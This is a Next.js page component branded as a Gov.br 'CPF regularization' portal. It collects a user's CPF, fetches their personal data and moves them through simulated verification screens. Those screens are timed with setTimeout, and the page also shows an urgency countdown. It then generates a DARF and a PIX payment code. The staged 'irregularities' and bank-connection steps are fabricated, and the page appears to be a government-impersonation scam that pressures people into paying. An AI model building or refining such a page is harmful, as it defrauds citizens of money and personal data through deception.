"use client"

import { useState, useCallback } from "react"
import Head from "next/head"
import {
  User,
  BarChart3,
  CheckCircle,
  CreditCard,
  Smartphone,
  FileText
} from "lucide-react"

import { Header } from "@/components/layout/header"
import { LoginStep } from "@/components/steps/login-step"
import { ProcessingStep } from "@/components/steps/processing-step"
import { UserProfileStep } from "@/components/steps/user-profile-step"
import { DarfGenerationStep } from "@/components/steps/darf-generation-step"
import { LoadingPaymentInfoStep } from "@/components/steps/loading-payment-info-step"
import { PixPaymentStep } from "@/components/steps/pix-payment-step"
import { PaymentSuccessStep } from "@/components/steps/payment-success-step"
import { PageTransition } from "@/components/ui/page-transition"
import { useCPFApi } from "@/hooks/use-cpf-api"
import { useStepTransition } from "@/hooks/use-step-transition"
import { useProgressAnimation } from "@/hooks/use-progress-animation"
import { usePaymentApi } from "@/hooks/use-payment-api"

interface CPFData {
  cpf: string
  nome: string
  sexo: string
  dataNascimento: string
}

export default function GovBrPortal() {
  const [cpf, setCpf] = useState("")
  const [cpfData, setCpfData] = useState<CPFData | null>(null)
  const [showSuccess, setShowSuccess] = useState(false)
  const [countdown, setCountdown] = useState({ hours: 12, minutes: 40, seconds: 33 })

  const { currentStep, isTransitioning, transitionToStep } = useStepTransition()
  const { fetchCPFData, isLoading, error } = useCPFApi()
  const { progress, processingStep } = useProgressAnimation(
    currentStep === "processing-regularization" ||
    currentStep === "processing-payment" ||
    currentStep === "loading-payment-info",
  )
  const {
    generatePixPayment,
    verifyPayment,
    isLoadingPayment,
    paymentError,
    paymentData,
    setPaymentData
  } = usePaymentApi()

  const handleCPFChange = useCallback((value: string) => {
    setCpf(value)
  }, [])

  const handleLogin = useCallback(async () => {
    const numbersOnly = cpf.replace(/\D/g, "")
    if (numbersOnly.length >= 11) {
      setShowSuccess(true)
      const data = await fetchCPFData(numbersOnly)

      if (data) {
        setCpfData(data)
        setTimeout(() => {
          setShowSuccess(false)
          transitionToStep("processing-regularization")
          setTimeout(() => transitionToStep("user-profile"), 4000)
        }, 1000)
      } else {
        setShowSuccess(false)
      }
    }
  }, [cpf, fetchCPFData, transitionToStep])

  const handleRegularize = useCallback(() => {
    transitionToStep("processing-payment")
    setTimeout(() => transitionToStep("darf-generation"), 4000)
  }, [transitionToStep])

  const handleGenerateDarf = useCallback(async () => {
    if (!cpfData) {
      console.error("CPF data missing for payment generation.")
      return
    }
    transitionToStep("loading-payment-info")

    const success = await generatePixPayment(cpfData)

    if (success) {
      setTimeout(() => transitionToStep("pix-payment"), 3500)
    } else {
      setTimeout(() => transitionToStep("darf-generation"), 1000)
    }
  }, [transitionToStep, generatePixPayment, cpfData])

  const copyPixCode = useCallback(() => {
    if (paymentData?.pixCode) {
      navigator.clipboard.writeText(paymentData.pixCode)
    }
  }, [paymentData])

  const handlePaymentSuccess = useCallback(() => {
    transitionToStep("payment-success")
  }, [transitionToStep])

  const processingRegularizationSteps = [
    {
      icon: User,
      title: "Verificando Identidade",
      description: "Validando dados pessoais",
      color: "blue",
    },
    {
      icon: BarChart3,
      title: "Analisando Situação",
      description: "Verificando irregularidades",
      color: "purple",
    },
    {
      icon: CheckCircle,
      title: "Preparando Solução",
      description: "Definindo próximas etapas",
      color: "green",
    },
  ]

  const processingPaymentSteps = [
    {
      icon: CreditCard,
      title: "Validando Pagamento",
      description: "Verificando informações do DARF",
      color: "green",
      progress: 100,
    },
    {
      icon: FileText,
      title: "Conectando com Banco",
      description: "Estabelecendo conexão segura",
      color: "blue",
      progress: 80,
    },
    {
      icon: Smartphone,
      title: "Gerando Código PIX",
      description: "Preparando forma de pagamento",
      color: "purple",
      progress: 60,
    },
  ]

  const loadingPaymentInfoSteps = [
    {
      icon: CreditCard,
      title: "Verificando Dados",
      description: "Validando informações fiscais",
      color: "blue",
    },
    {
      icon: BarChart3,
      title: "Calculando Valores",
      description: "Processando regularização",
      color: "purple",
    },
    {
      icon: Smartphone,
      title: "Gerando PIX",
      description: "Preparando pagamento",
      color: "green",
    },
  ]

  return (
    <>
      <Head>
        <title>Regularização CPF - Portal Gov.br</title>
        <meta name="description" content="Sistema de regularização via CPF com pagamento via Pix." />
      </Head>

      <PageTransition isTransitioning={isTransitioning}>
        {currentStep !== "login" && <Header cpfData={cpfData} />}

        {currentStep === "login" && (
          <LoginStep
            cpf={cpf}
            onCPFChange={handleCPFChange}
            onLogin={handleLogin}
            isLoading={isLoading}
            showSuccess={showSuccess}
            error={error}
          />
        )}

        {currentStep === "processing-regularization" && (
          <ProcessingStep
            title="Processando Regularização"
            subtitle="Verificando dados fiscais..."
            description="Aguarde alguns instantes"
            progress={progress}
            processingStep={processingStep}
            steps={processingRegularizationSteps}
            gradientFrom="from-blue-500"
            gradientTo="to-blue-700"
          />
        )}

        {currentStep === "user-profile" && (
          <UserProfileStep
            cpfData={cpfData}
            onRegularize={handleRegularize}
            countdown={countdown}
            setCountdown={setCountdown}
          />
        )}

        {currentStep === "processing-payment" && (
          <ProcessingStep
            title="Processando Pagamento"
            subtitle="Gerando código de pagamento..."
            description="Aguarde alguns instantes"
            progress={progress}
            processingStep={processingStep}
            steps={processingPaymentSteps}
            gradientFrom="from-green-500"
            gradientTo="to-blue-600"
          />
        )}

        {currentStep === "darf-generation" && (
          <DarfGenerationStep onGenerateDarf={handleGenerateDarf} cpfData={cpfData} />
        )}

        {currentStep === "loading-payment-info" && (
          <LoadingPaymentInfoStep
            progress={progress}
            processingStep={processingStep}
          />
        )}

        {currentStep === "pix-payment" && (
          <PixPaymentStep
            cpfData={cpfData}
            paymentData={paymentData}
            verifyPayment={() => verifyPayment(paymentData?.id || "")}
            copyPixCode={copyPixCode}
            onPaymentSuccess={handlePaymentSuccess}
          />
        )}

        {currentStep === "payment-success" && <PaymentSuccessStep />}
      </PageTransition>
    </>
  )
}
